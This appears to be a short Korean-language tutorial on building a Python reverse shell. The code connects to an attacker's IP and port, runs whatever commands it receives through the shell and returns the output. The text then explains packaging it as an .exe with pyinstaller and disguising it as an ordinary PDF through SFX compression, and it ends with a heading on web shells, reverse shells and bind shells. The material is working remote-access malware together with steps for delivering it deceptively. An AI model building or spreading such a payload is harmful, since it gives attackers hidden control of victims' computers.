```python
import socket
import subprocess

def connect(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        return s
    except Exception as e:
        print("[-] Connection failed:", e)
        return None

def main():
    ip = ''  # 공격자의 IP 주소를 입력하세요
    port =   # 공격자의 포트 번호를 입력하세요
    s = connect(ip, port)
    if s:
        while True:
            command = s.recv(1024).decode()
            if 'exit' in command.lower():
                s.close()
                break
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                s.sendall(output)
            except Exception as e:
                s.sendall(str(e).encode())
                pass

if __name__ == "__main__":
    main()

```
pip를 이용하여 pyinstaller로 .py 파일을 .exe 파일로 만들어줍니다.

우리는 이제 sfx 압축을 통해 위 파이썬 실행파일을 일반적인 pdf파일로 위장해야됩니다.

웹쉘 업로드, 리버스 쉘, 바인딩 쉘 차이점 
